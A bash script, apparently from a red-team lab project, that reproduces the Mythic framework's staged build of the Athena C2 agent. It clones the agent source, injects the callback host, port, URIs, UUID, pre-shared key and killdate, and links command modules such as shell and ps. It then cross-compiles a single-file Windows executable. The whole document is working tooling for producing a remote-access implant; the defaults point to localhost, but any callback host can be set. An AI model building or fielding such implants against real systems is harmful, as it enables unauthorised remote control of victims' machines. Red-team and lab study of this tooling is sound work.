#!/usr/bin/env bash
# Project ATMA — Athena modular publish, win-x64 from Linux.
#
# This is NOT "build the whole solution". Athena's Mythic builder
# (Payload_Type/athena/athena/mythic/agent_functions/builder.py)
# never builds Agent.sln — that sln includes every plugin and fails
# with a missing Agent.Crypto reference, because AthenaCore starts
# with NO command/profile/crypto references at all. The builder
# adds them, one by one, for the commands you actually picked.
# This script replicates that staged build, standalone, so it can
# be tested outside Mythic and then wired back into the service.
#
# Stages, in builder order:
#   1. Gather Files — copy agent_code to a temp build dir
#   2. Configure C2 — Http profile: Base.txt -> HttpProfile.cs with
#      callback_host / callback_port / get_uri / post_uri / query
#      substituted (host WITHOUT a port, like Poseidon's OPSEC rule)
#   3. Configure Agent — AgentConfig.cs: %UUID%, %PSK%,
#      callback_interval, callback_jitter, killdate
#   4. Add Tasks — `dotnet add AthenaCore reference <cmd>/<cmd>.csproj`
#      for each command, plus the profile project and the crypto
#      project (Aes if --aes-psk is given, else None), plus
#      Roots.xml assembly lines for profile + commands (trimming)
#   5. Compile Models DLL — dotnet build Agent.Models
#   6. Compile — dotnet publish AthenaCore -r win-x64, self-contained,
#      single-file, HandlerOS=windows (this is what pulls in
#      Agent.Managers.Windows instead of the Linux manager)
#   7. Zip — publish folder zipped, plus the bare .exe copied out
#
# The output is a genuine Windows PE32+ exe. It is cross-compiled
# on Linux with dotnet SDK 8 — it does NOT run on Linux, and this
# script does not try to run it. Verify with `file` (PE32+) and
# by checking the publish folder, not by executing it here.
#
# Usage:
#   bash lab/native/athena-build-win.sh \
#     --commands shell,ls,ps,config,exit \
#     --callback-host http://127.0.0.1 --callback-port 18080 \
#     --output ./athena-win-output
#   bash lab/native/athena-build-win.sh --help
#
# Defaults are a lab build: http C2 on 127.0.0.1:18080, no AES key
# (crypto None), x64, Release, single-file, not trimmed, not obfuscated.
# Requires: dotnet SDK 8+, git, python3, zip. No Docker, no Windows host.
set -euo pipefail

COMMANDS="shell,ls,ps,config,exit"
PROFILE="Http"
CALLBACK_HOST="http://127.0.0.1"
CALLBACK_PORT="18080"
GET_URI="index"
POST_URI="data"
QUERY_PATH="q"
INTERVAL="10"
JITTER="23"
UUID="$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo athena-lab-uuid)"
AES_PSK=""
ARCH="x64"
CONFIGURATION="Release"
OUTPUT="./athena-win-output"
KEEP_BUILD=""
ATHENA_SRC=""

while [ $# -gt 0 ]; do
  case "$1" in
    --commands) COMMANDS="$2"; shift 2;;
    --profile) PROFILE="$2"; shift 2;;
    --callback-host) CALLBACK_HOST="$2"; shift 2;;
    --callback-port) CALLBACK_PORT="$2"; shift 2;;
    --get-uri) GET_URI="$2"; shift 2;;
    --post-uri) POST_URI="$2"; shift 2;;
    --query-path) QUERY_PATH="$2"; shift 2;;
    --interval) INTERVAL="$2"; shift 2;;
    --jitter) JITTER="$2"; shift 2;;
    --uuid) UUID="$2"; shift 2;;
    --aes-psk) AES_PSK="$2"; shift 2;;
    --arch) ARCH="$2"; shift 2;;
    --configuration) CONFIGURATION="$2"; shift 2;;
    --output) OUTPUT="$2"; shift 2;;
    --keep-build) KEEP_BUILD=1; shift;;
    --athena-src) ATHENA_SRC="$2"; shift 2;;
    --help) sed -n '1,40p' "$0"; exit 0;;
    *) echo "[-] unknown arg: $1 (try --help)" >&2; exit 2;;
  esac
done

command -v dotnet >/dev/null || { echo "[-] dotnet SDK 8+ not found — install dotnet-sdk-8.0 first" >&2; exit 1; }
dotnet --version | grep -q '^8\.' || echo "[!] dotnet version is not 8.x — Athena targets net8.0, continuing anyway"

RID="win-$ARCH"
CRYPTO="None"; [ -n "$AES_PSK" ] && CRYPTO="Aes"
# Resolve --output to an absolute path BEFORE cd-ing into the build
# dir, otherwise a relative output lands inside the temp dir and is
# deleted with it at the end (bug found on the first real run).
case "$OUTPUT" in /*) ;; *) OUTPUT="$PWD/$OUTPUT";; esac
KILLDATE="$(date -d '+1 year' +%Y-%m-%d 2>/dev/null || date -v+1y +%Y-%m-%d)"

if [ -n "$ATHENA_SRC" ]; then
  SRC_CODE="$ATHENA_SRC/Payload_Type/athena/athena/agent_code"
  [ -d "$SRC_CODE" ] || { echo "[-] no agent_code at $SRC_CODE" >&2; exit 1; }
  echo "[*] Using local Athena source: $SRC_CODE"
else
  SRC_TMP="$(mktemp -d)"
  echo "[*] Cloning Athena (shallow) to $SRC_TMP ..."
  git clone --depth 1 https://github.com/MythicAgents/Athena "$SRC_TMP/athena" >/dev/null
  SRC_CODE="$SRC_TMP/athena/Payload_Type/athena/athena/agent_code"
fi

BUILD_DIR="$(mktemp -d)"
if [ -n "$KEEP_BUILD" ]; then echo "[*] Build dir kept: $BUILD_DIR"; fi
echo "[*] Stage 1 — Gather Files: copying agent_code to $BUILD_DIR"
cp -r "$SRC_CODE/." "$BUILD_DIR/"
cd "$BUILD_DIR"

# Stage 2 — Configure C2 (Http only in this script; other profiles
# follow the same Base.txt pattern in builder.py: Smb, Websocket,
# Slack, Discord, GitHub, Zoom)
echo "[*] Stage 2 — Configure C2: profile $PROFILE, $CALLBACK_HOST:$CALLBACK_PORT"
python3 - "$BUILD_DIR" "$UUID" "$CALLBACK_HOST" "$CALLBACK_PORT" "$GET_URI" "$POST_URI" "$QUERY_PATH" <<'PY'
import pathlib, sys
build, uuid, host, port, get_uri, post_uri, query = sys.argv[1:8]
profile_dir = pathlib.Path(build) / "Agent.Profiles.Http"
src = (profile_dir / "Base.txt").read_text()
# Builder replaces the bare parameter names in Base.txt, not %TOKENS%.
out = (src.replace("callback_host", host).replace("callback_port", port)
          .replace("get_uri", get_uri).replace("post_uri", post_uri)
          .replace("query_path_name", query)
          .replace("%HOSTHEADER%", "").replace("%USERAGENT%", "Mozilla/5.0")
          .replace("//%CUSTOMHEADERS%", ""))
(profile_dir / "HttpProfile.cs").write_text(out)
print("    HttpProfile.cs written from Base.txt")
PY

# Stage 3 — Configure Agent
echo "[*] Stage 3 — Configure Agent: uuid=$UUID crypto=$CRYPTO"
python3 - "$BUILD_DIR" "$UUID" "$AES_PSK" "$INTERVAL" "$JITTER" "$KILLDATE" <<'PY'
import pathlib, sys
build, uuid, psk, interval, jitter, killdate = sys.argv[1:7]
p = pathlib.Path(build) / "AthenaCore" / "Config" / "AgentConfig.cs"
s = p.read_text()
s = (s.replace("%UUID%", uuid).replace("%PSK%", psk)
      .replace("callback_interval", interval).replace("callback_jitter", jitter)
      .replace("killdate", killdate))
p.write_text(s)
print("    AgentConfig.cs substituted")
PY

# Stage 4 — Add Tasks (modular: one reference per command)
echo "[*] Stage 4 — Add Tasks: $COMMANDS"
IFS=',' read -ra CMD_ARR <<< "$COMMANDS"
REFS=()
ROOTS=""
for cmd in "${CMD_ARR[@]}"; do
  csproj="$cmd/$cmd.csproj"
  if [ ! -f "$csproj" ]; then echo "[-] no command project: $csproj (check the command name — it must match a folder in agent_code)" >&2; exit 1; fi
  REFS+=("$csproj")
  ROOTS+="<assembly fullname=\"$cmd\"/>\n"
done
PROFILE_CSPROJ="Agent.Profiles.$PROFILE/Agent.Profiles.$PROFILE.csproj"
[ -f "$PROFILE_CSPROJ" ] || { echo "[-] no profile project: $PROFILE_CSPROJ" >&2; exit 1; }
ROOTS="<assembly fullname=\"Agent.Profiles.$PROFILE\"/>\n$ROOTS"
if [ ${#REFS[@]} -gt 0 ]; then
  dotnet add AthenaCore reference "${REFS[@]}" >/dev/null
fi
dotnet add AthenaCore reference "$PROFILE_CSPROJ" >/dev/null
dotnet add AthenaCore reference "Agent.Crypto.$CRYPTO/Agent.Crypto.$CRYPTO.csproj" >/dev/null
python3 - "$BUILD_DIR" "$ROOTS" <<'PY'
import pathlib, sys
build, roots = sys.argv[1], sys.argv[2]
p = pathlib.Path(build) / "AthenaCore" / "Roots.xml"
s = p.read_text()
s = s.replace("<!-- {{REPLACEME}} -->", roots.replace("\\n", "\n"))
p.write_text(s)
print("    Roots.xml assembly lines added")
PY
echo "    References added: ${REFS[*]} + $PROFILE_CSPROJ + Agent.Crypto.$CRYPTO"

# Stage 5 — Compile Models DLL
echo "[*] Stage 5 — Compile Models DLL"
dotnet build Agent.Models -c "$CONFIGURATION" "/p:Obfuscate=false" "/p:PayloadUUID=$UUID" --nologo -v q

# Stage 6 — Compile (publish win-x64)
echo "[*] Stage 6 — Compile: dotnet publish AthenaCore -r $RID"
dotnet publish AthenaCore -r "$RID" -c "$CONFIGURATION" --nologo \
  --self-contained=true \
  /p:PublishSingleFile=true /p:EnableCompressionInSingleFile=true \
  /p:PublishTrimmed=false /p:Obfuscate=false /p:PublishAOT=false \
  /p:DebugType=None /p:DebugSymbols=false /p:PluginsOnly=false \
  /p:HandlerOS=windows /p:UseSystemResourceKeys=false \
  /p:InvariantGlobalization=false /p:StackTraceSupport=false \
  /p:PayloadUUID="$UUID" /p:WindowsService=false /p:RandomName=

PUBLISH_DIR="AthenaCore/bin/$CONFIGURATION/net8.0/$RID/publish"
[ -d "$PUBLISH_DIR" ] || { echo "[-] publish dir not found: $PUBLISH_DIR" >&2; exit 1; }
EXE="$PUBLISH_DIR/AthenaCore.exe"
[ -f "$EXE" ] || { echo "[-] no AthenaCore.exe in $PUBLISH_DIR — listing:"; ls -lh "$PUBLISH_DIR" | head -20; exit 1; }

# Stage 7 — Zip + copy out (output is permanent, build dir is temp)
echo "[*] Stage 7 — Zip + output to $OUTPUT"
mkdir -p "$OUTPUT"
cp "$EXE" "$OUTPUT/athena-win-$ARCH.exe"
(cd "$PUBLISH_DIR" && zip -q -r "$OUTPUT/athena-win-$ARCH.zip" .)
echo "[*] SUCCESS"
echo "    exe:  $OUTPUT/athena-win-$ARCH.exe  ($(stat -c%s "$OUTPUT/athena-win-$ARCH.exe") bytes)"
echo "    zip:  $OUTPUT/athena-win-$ARCH.zip"
file "$OUTPUT/athena-win-$ARCH.exe" || true
echo "    uuid: $UUID  profile: $PROFILE  commands: $COMMANDS  rid: $RID"
if [ -z "$KEEP_BUILD" ]; then rm -rf "$BUILD_DIR"; else echo "    build dir kept: $BUILD_DIR"; fi
